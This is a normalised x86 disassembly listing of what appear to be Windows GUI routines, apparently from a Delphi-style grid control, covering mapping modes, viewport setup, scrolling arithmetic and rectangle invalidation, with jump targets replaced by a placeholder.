jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43d7fc
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
setg al
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
cmp eax [ edx + 0x4 ]
setg al
pop esi
pop ebp
retn
sub_4736dc
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_40349c
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43d7fc
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
setge al
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
cmp eax [ edx + 0x4 ]
setge al
pop esi
pop ebp
retn
sub_473728
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
mov [ eax ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov bx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax ebx
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x290 ]
or ax bx
mov ebx eax
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ ebp - 0x4 ]
call sub_43d840
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3c ] eax
mov eax [ ebp - 0x4 ]
call sub_43d7fc
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
push ebp
call sub_473690
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
cmp esi [ eax + 0x34 ]
jle r-xdata
test bl 0x80
je r-xdata
test bl 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
cmp esi [ eax + 0x34 ]
jge r-xdata
push ebp
call sub_4736dc
pop ecx
test al al
jne r-xdata
push ebp
mov eax [ ebp + 0x8 ]
mov cl 0x3
mov edx [ ebp - 0x8 ]
call sub_473578
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp + 0x8 ]
add eax 0x30
mov cl 0x2
mov edx esi
call sub_473578
pop ecx
sub_4737fc
push ebx
add esp 0xfffffff0
mov ebx eax
test dl dl
je r-xdata
mov ecx esp
xor edx edx
xor eax eax
call sub_412988
lea ecx [ esp + 0x8 ]
mov edx 0x1
mov eax 0x1
call sub_412988
push 0x8
mov eax [ ebx + 0x208 ]
call sub_41e4e4
push eax
call SetMapMode
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_41e4e4
push eax
call SetWindowOrgEx
push 0x0
mov eax ebx
call sub_43d840
push eax
mov eax ebx
call sub_43d7fc
push eax
mov eax [ ebx + 0x208 ]
call sub_41e4e4
push eax
call SetViewportExtEx
push 0x0
mov eax ebx
call sub_43d840
imul [ esp + 0x10 ]
push eax
mov eax ebx
call sub_43d7fc
imul [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_41e4e4
push eax
call SetWindowExtEx
mov eax ebx
call sub_43d7fc
mov ecx esp
xor edx edx
call sub_412988
lea ecx [ esp + 0x8 ]
mov edx 0x1
or eax 0xffffffff
call sub_412988
push 0x8
mov eax [ ebx + 0x208 ]
call sub_41e4e4
push eax
call SetMapMode
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_41e4e4
push eax
call SetWindowOrgEx
push 0x0
mov eax ebx
call sub_43d840
push eax
mov eax ebx
call sub_43d7fc
push eax
mov eax [ ebx + 0x208 ]
call sub_41e4e4
push eax
call SetViewportExtEx
push 0x0
mov eax ebx
call sub_43d840
imul [ esp + 0x10 ]
push eax
mov eax ebx
call sub_43d7fc
imul [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_41e4e4
push eax
call SetWindowExtEx
jmp r-xdata
add esp 0x10
pop ebx
retn
sub_473950
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
mov eax [ eax + 0x10 ]
call sub_4243f4
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
and ecx ebx
mov edx esi
not edx
and edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_472120
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0xc ] eax
push 0x0
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4445f8
push eax
call InvalidateRect
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4739bc
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov eax [ ebx ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x224 ] 0x0
je r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x230 ]
mov eax [ ebx ]
mov edx [ eax + 0x21c ]
mov eax [ ebx ]
add eax 0x220
call sub_471260
mov eax [ ebx ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x21c ]
mov eax [ ebx ]
add eax 0x224
mov ecx 0x1
call sub_471260
mov eax [ ebx ]
mov edx [ eax + 0x228 ]
mov [ ebp - 0x8 ] edx
mov edx [ eax + 0x22c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x24c ]
mov edx [ ebx ]
cmp eax [ edx + 0x22c ]
jg r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x234 ]
mov eax [ ebx ]
mov edx [ eax + 0x24c ]
mov eax [ ebx ]
add eax 0x250
call sub_471260
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
mov edx [ ebx ]
cmp eax [ edx + 0x228 ]
jg r-xdata
dec eax
mov [ ebp - 0x4 ] eax
mov edx [ ebx ]
mov edx [ edx + 0x228 ]
mov eax [ ebp - 0x8 ]
cmp edx eax
jne r-xdata
dec eax
mov [ ebp - 0x8 ] eax
push 0x1
push 0x1
mov edx [ ebx ]
mov ecx [ ebp - 0x4 ]
xchg edx eax
call sub_47497c
mov edx [ ebx ]
mov edx [ edx + 0x22c ]
cmp edx [ ebp - 0x4 ]
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_4748f4
mov eax [ ebx ]
mov eax [ eax + 0x214 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x210 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebx ]
call sub_4742ac
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x258 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4c ]
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x292 ] 0x0
jne r-xdata
mov eax [ ebx ]
call sub_4752bc
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x70 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x6c ]
mov eax [ ebx ]
mov si 0xffa8
call sub_40349c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
mov eax [ eax + 0x25c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x1c ]
je r-xdata
mov eax [ ebx ]
call sub_4448fc
test al al
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx ]
call sub_473310
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x68 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffff98
xor ecx ecx
call sub_473950
pop ecx
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffc8
or ecx 0xffffffff
call sub_473950
pop ecx
sub_473b64
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4448fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
mov [ ebp - 0x70 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x21c ] ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] esi
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x238 ]
jge r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_473310
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x23c ]
jge r-xdata
dec ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x238 ] ebx
xor eax eax
push ebp
push j_sub_403740#2
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
call sub_4739bc
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473c3c
push ebx
push esi
add esp 0xffffff90
mov esi edx
mov ebx eax
mov eax ebx
call sub_4448fc
test al al
je r-xdata
add esp 0x70
pop esi
pop ebx
retn
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_473310
mov eax [ esi ]
cmp eax [ esp + 0x20 ]
jg r-xdata
mov eax [ ebx + 0x258 ]
mov [ esp + 0x8 ] eax
mov eax [ ebx + 0x25c ]
mov [ esp + 0xc ] eax
push esp
lea ecx [ esp + 0x14 ]
mov edx esi
mov eax ebx
call sub_473548
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ esi ]
cmp eax [ ebx + 0x258 ]
jge r-xdata
mov edx [ esi + 0x4 ]
cmp edx [ esp + 0x50 ]
jg r-xdata
cmp eax [ esp + 0x20 ]
jle r-xdata
mov [ ebx + 0x258 ] eax
jmp r-xdata
cmp eax [ ebx + 0x258 ]
jl r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x25c ]
jge r-xdata
mov eax [ esp ]
mov [ ebx + 0x258 ] eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x25c ]
jge r-xdata
cmp eax [ esp + 0x50 ]
jle r-xdata
mov [ ebx + 0x25c ] eax
jmp r-xdata
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_474e10
mov eax [ esp + 0x4 ]
mov [ ebx + 0x25c ] eax
sub_473d04
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d758
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_473e36
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x208 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov dl 0x2
call sub_41d9e8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov dl 0xe
call sub_41d9cc
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_41da18
xor eax eax
push ebp
push sub_473e19
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x28e ] 0x2
jne r-xdata
mov edx [ ebx + 0x264 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_41e09c
mov ecx [ edi + 0x38 ]
mov edx [ ebx + 0x264 ]
mov eax [ ebp - 0x8 ]
call sub_41e03c
mov eax ebx
mov si 0xffc8
call sub_40349c
test al al
je r-xdata
mov ecx [ ebx + 0x264 ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41e09c
mov ecx [ ebx + 0x264 ]
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x8 ]
call sub_41e03c
jmp r-xdata
mov ecx [ ebx + 0x264 ]
mov edx [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41e09c
mov edx [ edi + 0xc ]
sub edx [ edi + 0x8 ]
mov ecx [ ebx + 0x264 ]
mov eax [ ebp - 0x8 ]
call sub_41e03c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473e20
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41e3f0
retn
sub_473e44
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d758
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_473fc5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
push ebp
push sub_473fa8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov dl 0x2
call sub_41d9e8
mov eax [ ebx + 0x10 ]
mov dl 0xe
call sub_41d9cc
mov eax [ ebx + 0x10 ]
mov edx 0x5
call sub_41da18
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x4
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x270 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_472120
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x26c ]
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_472120
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x26c ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40349c
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40349c
test al al
jne r-xdata
mov esi [ ebp - 0x14 ]
mov esi [ ebp - 0xc ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov esi [ ebp - 0x18 ]
jmp r-xdata
mov esi [ ebp - 0x18 ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473faf
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_41e3f0
retn
mov ecx esi
xor edx edx
mov eax ebx
call sub_41e09c
mov eax [ ebp - 0x4 ]
call sub_43d7fc
mov edx eax
mov ecx esi
mov eax ebx
call sub_41e03c
jmp r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_41e09c
mov eax [ ebp - 0x4 ]
call sub_43d840
mov ecx eax
mov edx esi
mov eax ebx
call sub_41e03c
sub_473fd4
push ebp
mov ebp esp
push esi
mov esi eax
mov al [ ebp + 0x8 ]
push eax
push 0x1
mov eax esi
call sub_47497c
mov eax esi
call sub_4769b0
mov eax esi
mov si 0xffeb
call sub_40349c
pop esi
pop ebp
retn 0x4
sub_474000
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
xor esi esi
mov eax [ ebx + 0x18 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax [ ebx + 0x1c ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
dec edx
sub edx eax
jl r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
xor esi esi
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add esi eax
cmp esi [ ebx + 0xc ]
jle r-xdata
sub_47405c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebx + 0x18 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov eax [ ebx + 0x10 ]
cmp esi eax
jle r-xdata
mov eax [ ebx + 0x1c ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_474000
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax ebx
mov edx esi
call sub_474000
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi eax
mov eax [ ebx + 0x20 ]
dec eax
cmp esi eax
jge r-xdata
mov eax [ ebx + 0x1c ]
cmp esi eax
jge r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
mov edx [ ebp + 0xc ]
add eax [ edx ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
mov eax ebx
mov edx esi
call sub_474000
test eax eax
jne r-xdata
inc esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx 0x10
call sub_402cbc
jmp r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebx + 0xc ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jge r-xdata
dec esi
mov al [ ebp - 0x5 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov [ ebp - 0x5 ] 0x1
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
add [ edx ] eax
sub_474138
push ebp
mov ebp esp
add esp 0xffffff88
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov edx 0x10
call sub_402cbc
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0xc ]
jg r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_473310
mov eax [ ebp - 0x68 ]
inc eax
mov esi [ ebp - 0x14 ]
cmp eax esi
jl r-xdata
mov eax [ ebp - 0x38 ]
inc eax
cmp eax [ ebp - 0x10 ]
jl r-xdata
push ebp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
lea eax [ ebp - 0x78 ]
mov ecx [ ebp - 0xc ]
mov edx esi
call sub_47405c
pop ecx
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_40349c
test al al
je r-xdata
push ebp
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
mov eax [ ebp - 0x4 ]
add eax 0xc
push eax
lea eax [ ebp - 0x48 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_47405c
pop ecx
mov eax [ ebx + 0x208 ]
call sub_41e184
test al al
jne r-xdata
mov esi [ ebp - 0x4 ]
mov esi [ esi ]
mov eax ebx
call sub_43d7fc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax ebx
call sub_43d7fc
sub eax esi
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_474228
mov edx [ eax + 0x238 ]
mov [ eax + 0x258 ] edx
mov edx [ eax + 0x23c ]
mov [ eax + 0x25c ] edx
mov edx [ eax + 0x258 ]
mov [ eax + 0x228 ] edx
mov edx [ eax + 0x25c ]
mov [ eax + 0x22c ] edx
mov edx [ eax + 0x228 ]
mov [ eax + 0x210 ] edx
mov edx [ eax + 0x22c ]
mov [ eax + 0x214 ] edx
test [ eax + 0x249 ] 0x10
je r-xdata
retn
mov edx [ eax + 0x21c ]
dec edx
mov [ eax + 0x210 ] edx
sub_474288
push esi
add esp 0xfffffff0
mov esi eax
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0xc ] ecx
mov [ esp + 0x8 ] edx
mov edx esp
mov eax esi
call sub_4742b4
add esp 0x10
pop esi
retn
sub_4742b4
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_4448fc
test al al
je r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
push 0x1
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_474138
push 0x0
lea eax [ esp + 0x14 ]
push eax
mov eax ebx
call sub_4445f8
push eax
call InvalidateRect
sub_4742fc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x23c ]
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x238 ]
pop ebp
retn
sub_474324
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
pop ebp
retn
sub_474340
push ebp
mov ebp esp
add esp 0xfffffff8
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x70 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea edx [ eax + 0x258 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_473548
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x25c ]
sub eax [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x258 ]
sub eax [ ebp - 0x8 ]
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax 0x1
cmp eax 0x1
jge r-xdata
sub_4743a0
push ebp
mov ebp esp
add esp 0xffffffa0
lea edx [ ebp - 0x60 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_473310
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push [ eax + 0x25c ]
mov eax [ ebp - 0x20 ]
pop edx
sub eax edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push [ eax + 0x258 ]
mov eax [ ebp - 0x50 ]
pop edx
sub eax edx
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax 0x1
cmp eax 0x1
jge r-xdata
sub_4743f4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x74 ]
cmp eax 0x7
ja r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
jmp [ eax * 4 + jump_table_474414 ]
sub ebx edi
jmp r-xdata
add ebx edi
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_474340
pop ecx
imul edi
sub ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4743a0
pop ecx
imul edi
add ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
test [ eax + 0x249 ] 0x40
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_474324
pop ecx
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4742fc
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov si 0xffc8
call sub_40349c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x74 ] 0x4
jne r-xdata
push 0x7f
mov eax [ ebp + 0x8 ]
push eax
call sub_474324
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_4742fc
pop ecx
sub ebx eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
call MulDiv
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_4742fc
pop ecx
add ebx eax
jmp r-xdata
dec edi
jne r-xdata
push 0x7f
mov eax [ ebp + 0x8 ]
push eax
call sub_474324
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_4742fc
pop ecx
sub ebx eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
call MulDiv
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_474324
pop ecx
mov ebx eax
pop eax
sub ebx eax
jmp r-xdata
sub_47452c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax + 0x288 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x54 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_476384
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_43d7fc
mov edi eax
mov eax [ ebp + 0x8 ]
sub edi [ eax - 0x6c ]
mov eax esi
cmp eax 0x7
ja r-xdata
test ebx ebx
jge r-xdata
jmp [ eax * 4 + jump_table_47457f ]
mov eax [ ebp - 0x8 ]
sub eax edi
cmp ebx eax
jl r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x208 ]
mov edx r-xdata
call sub_41e320
mov edx [ ebp + 0x8 ]
imul [ edx - 0x78 ]
sub ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x208 ]
mov edx r-xdata
call sub_41e320
mov edx [ ebp + 0x8 ]
imul [ edx - 0x78 ]
add ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x78 ]
imul edi
sub ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x78 ]
imul edi
add ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
test [ eax + 0x249 ] 0x40
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ebx [ ebp - 0x8 ]
sub ebx edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x288 ]
cmp ebx eax
je r-xdata
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov si 0xffc8
call sub_40349c
test al al
jne r-xdata
cmp esi 0x4
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x288 ] ebx
mov edx eax
sub edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor ecx ecx
call sub_474d64
lea eax [ ebp - 0x18 ]
xor ecx ecx
mov edx 0x10
call sub_402cbc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea edx [ ebp - 0x18 ]
call sub_4742b4
mov eax [ ebp + 0x8 ]
